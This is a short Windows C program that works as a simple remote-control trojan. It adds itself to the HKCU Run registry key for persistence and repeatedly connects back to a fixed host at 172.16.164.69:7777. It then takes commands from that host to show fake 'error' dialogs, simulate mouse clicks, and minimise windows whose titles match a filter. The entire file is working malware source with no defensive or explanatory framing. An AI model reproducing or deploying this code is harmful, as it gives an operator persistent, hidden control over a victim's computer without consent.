	#include <ws2tcpip.h> 
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

WSADATA data;
SOCKET sock;
SOCKADDR_IN adres;

int i;

char path[100];
long size = 100;
HKEY hkey = 0;

char welkom[] = "connected\n	";
char command[40];
char name[40];
char filter[3];

INPUT inp;

void window(HWND win,LPARAM lparam){
	GetWindowTextA(win,name,40);
	if(filter[0] == name[0] && filter[1] == name[1] && filter[2] == name[2]){
		CloseWindow(win);
	}
	return;
}

void main(){
	HANDLE name = GetCurrentProcess();
	QueryFullProcessImageNameA(name,0,path,&size);
	RegCreateKey(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
	RegSetValueExA(hkey,"myapp",0,REG_SZ,path,100);
	WORD ver = MAKEWORD(2,2);
	WSAStartup(ver, &data);
try_again:
	sock = socket(AF_INET,SOCK_STREAM,0);
 	adres.sin_family = AF_INET;
	adres.sin_port = htons(7777);
	inet_pton(AF_INET,"172.16.164.69",&adres.sin_addr);
	while(connect(sock,(SOCKADDR*)&adres,sizeof(adres))){}
	send(sock,welkom,sizeof(welkom),0);
	for(;;){
		if(recv(sock,command,sizeof(command),0) == -1){goto try_again;};
		switch(command[0]){
		case 'g':
			MessageBox(0,command+2,"error",0);
			break;
		case 'c':
			inp.mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
			SendInput(1,&inp,sizeof(inp));
			Sleep(10);
			inp.mi.dwFlags = MOUSEEVENTF_LEFTUP;
			SendInput(1,&inp,sizeof(inp));
			break;
		case 's':
			memcpy(filter,command+2,3);
			EnumWindows(&window,0);
			break;
		}
		Sleep(1000);
	}
}








